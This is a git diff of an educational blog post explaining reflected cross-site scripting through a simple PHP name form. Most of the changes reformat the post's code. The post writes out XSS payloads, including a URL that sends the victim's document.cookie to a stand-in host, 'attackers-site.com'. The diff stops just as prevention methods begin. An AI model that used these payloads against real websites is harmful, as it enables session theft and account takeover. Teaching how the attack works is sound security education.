@@ -36,7 +36,6 @@ So let's take a look at a simple form that I have written.
 Below we can see the form in the browser.
 
 ![Simple Form](../../assets/images/xss/1.png)
-1.png
 
 After typing my name in the input box, we get the following output.
 
@@ -44,7 +43,7 @@ After typing my name in the input box, we get the following output.
 
 Now you might be thinking that all is well and good, but what if someone submits the following text as input.
 
-<b>Abhishek</b>
+```<b>Abhishek</b>```
 
 We get the following output.
 
@@ -52,7 +51,7 @@ We get the following output.
 
 Wait, what? So if you pass in an HTML tag, the output is modified based on the tag. This is because when the PHP code echos the content of 'fname,' the resulting HTML sent back from the server looks like this. 
 
-<p>Hi <b>Abhishek</b>!</p>
+```<p>Hi <b>Abhishek</b>!</p>```
 
 This can be verified by looking at the source.
 
@@ -60,22 +59,22 @@ This can be verified by looking at the source.
 
 When the browser looks at the HTML, it sees the <b> tag and thinks that text in between is supposed to be rendered bold. The ability to pass in HTML code is known as HTML injection. This has a lot of implications (well other than being able to stylize your output). What if we want to pass in javascript code in the text field. Let's try the following input.
 
-```JS
+```javascript
 <script>alert("test");</script>
 ```
 We get the following output.
 
-![JS in Form](../../assets/images/xss/4.png)
+![JS in Form](../../assets/images/xss/5.png)
 
 So why did this happen? Well, this is because like in the previous example, we were able to inject code into the page returned by the server. This can be seen by looking at the source. 
 
-![Form-Source-JS](../../assets/images/xss/5.png)
+![Form-Source-JS](../../assets/images/xss/xss-1.png)
 
-When the browser sees the <script> tag, it immediately runs the codes in between. What we saw above is called Cross-Site Scripting (XSS), more specifically Reflected XSS. It is reflected since the script passed in as input is bounced from the web server back to the user's browser. 
+When the browser sees the ```<script>``` tag, it immediately runs the codes in between. What we saw above is called Cross-Site Scripting (XSS), more specifically Reflected XSS. It is reflected since the script passed in as input is bounced from the web server back to the user's browser. 
 
 So what can we do with this? An alert box might not be harmful to the user, but what about the case where the user is logged in. If we pass the following as input
 
-```JS
+```javascript
 <script>alert(document.cookie)</script>
 ```
 
@@ -85,16 +84,12 @@ we get the following output.
 
 Since the cookie is retrievable, the attacker can, once he gets the cookie, log in as the user and wreak havoc. One way the attacker can retrieve the cookies is by setting up a web server and sending the URL with the malicious code to a target. When the user clicks on the link, his/her browser will then send the cookies to the attacker's server. An example of such an URL is as.
 
-```JS
+```javascript
 http://vulnerable-website?param=<script>window.location="http://attackers-site.com/?cookie=" + document.cookie
 </script>
 ```
 
 The cookie is sent as a GET value which the attacker can then view on his/her server. 
-
-//Say later blog
-Another type of XSS which presents itself when user input is stored on the server and can be viewed is discussed below. Let's say you set up a message board where users can post messages. 
-//-------------------------------------------
 
 Well, how can we prevent the above attack? 
 Some of the ways we can prevent XSS are:
